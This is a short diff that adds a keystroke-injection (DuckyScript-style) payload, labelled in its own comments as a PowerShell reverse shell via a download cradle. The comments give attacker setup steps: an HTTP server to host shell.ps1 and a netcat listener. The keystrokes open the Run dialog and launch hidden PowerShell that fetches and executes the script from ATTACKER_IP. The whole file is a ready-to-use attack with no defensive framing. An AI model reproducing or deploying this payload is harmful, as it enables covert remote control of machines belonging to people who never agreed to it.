@@ -1,0 +1,9 @@
+REM PowerShell reverse shell via download cradle
+REM SETUP: host shell.ps1 on your machine first:
+REM   python3 -m http.server 8080
+REM   nc -lvnp 4444
+REM CHANGE: ATTACKER_IP before use
+GUI r
+DELAY 800
+STRING powershell -nop -w hidden -c "IEX(IWR http://ATTACKER_IP:8080/shell.ps1 -UseBasicParsing)"
+ENTER
